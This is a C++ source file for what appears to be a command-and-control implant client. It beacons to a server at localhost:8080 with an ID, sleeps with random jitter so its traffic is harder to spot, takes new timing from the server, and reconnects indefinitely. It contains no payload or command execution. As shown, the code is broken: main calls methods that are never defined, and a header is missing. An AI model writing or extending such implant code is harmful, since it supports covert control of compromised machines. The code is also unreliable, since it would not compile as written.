#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <json/json.h>
#include <cpprest/http_client.h>
#include <cpprest/filestream.h>

class Client {
public:
    std::pair<int, std::string> get_request(const std::string& url) {
        web::http::client::http_client client(U(url));
        web::http::http_response response = client.request(web::http::methods::GET).get();
        int status = response.status_code();
        std::string data = response.extract_string().get();
        return {status, data};
    }

    std::pair<int, std::string> post_request(const std::string& url, const web::json::value& body) {
        web::http::client::http_client client(U(url));
        web::http::http_response response = client.request(web::http::methods::POST, U(""), body).get();
        int status = response.status_code();
        std::string data = response.extract_string().get();
        return {status, data};
    }

    void beacon(int timer, int user_id) {
        while (true) {
            std::string url = "http://" + address[0] + ":" + address[1] + "/beacon?id=" + std::to_string(user_id);
            auto r = get_request(url);
            web::json::value data;
            try {
                data = web::json::value::parse(r.second);
            } catch (const web::json::json_exception&) {
                // Handle JSON parse error
            }

            if (data.has_field(U("timer"))) {
                timer = data[U("timer")].as_integer();
            }

            try {
                std::this_thread::sleep_for(std::chrono::seconds(timer + rand() % (2 * jitter + 1) - jitter));
            } catch (const std::exception&) {
                std::this_thread::sleep_for(std::chrono::seconds(timer));
            }
        }
    }

private:
    std::vector<std::string> address = {"localhost", "8080"};
    int jitter = 5;
};

int main() {
    int timer = 20;
    int ID = -1;
    int jitter = -1;

    try {
        Client client;
        while (true) {
            try {
                if (ID != -1 && jitter != -1) {
                    client.reconnect(ID, jitter, timer);
                } else {
                    std::tie(timer, ID, jitter) = client.httpConnection();
                }
                client.beacon(timer, ID);
            } catch (const std::exception& e) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }
    } catch (const std::exception& e) {
        std::cout << "exit" << std::endl;
    }

    return 0;
}